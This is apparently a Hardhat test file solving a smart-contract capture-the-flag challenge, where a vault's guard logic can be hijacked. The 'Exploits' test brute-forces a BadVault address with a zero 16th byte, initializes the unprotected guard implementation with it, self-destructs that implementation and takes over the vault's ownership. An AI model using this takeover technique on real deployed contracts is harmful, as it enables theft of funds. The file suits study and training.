const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("Vault", () => {
    const get16 = (addy) => {
        const addressBuffer = Buffer.from(addy.slice(2), 'hex');
        const byte16 = addressBuffer[15];
        return byte16;
    }

    before( async () => {
        [master, player] = await ethers.getSigners();

        Registry = await ethers.getContractFactory("GuardRegistry");
        registry = await Registry.deploy();

        GuardLogic = await ethers.getContractFactory("SingleOwnerGuard");
        guardLogic = await GuardLogic.deploy();
        await registry.registerGuardImplementation(guardLogic.address, true);

        Vault = await ethers.getContractFactory("Vault");
        vault = await Vault.deploy(registry.address);
        guardAddress = await vault.guard();
        guard = await ethers.getContractAt("SingleOwnerGuard", guardAddress); 

        await guard.addPublicOperation("deposit");
        await guard.addPublicOperation("withdraw");
    });

    it("Exploits", async () => {
        BadVault = await ethers.getContractFactory("BadVault");
        // find addy with 00 16-th byte
        let found = false;
        while(!found) {
            badVault = await BadVault.deploy();
            if (get16(badVault.address) == 0) found = true;
        }

        await guardLogic.initialize(badVault.address);
        // self destruct the implementation
        await badVault.attack(guardLogic.address);
        // change owner
        await badVault.connect(player).callFromVault(vault.address, player.address);
    });

    after(async () => {
        /** SUCCESS CONDITIONS */
        expect(
            await vault.owner()
        ).to.be.not.equal(master.address);        
    });
});

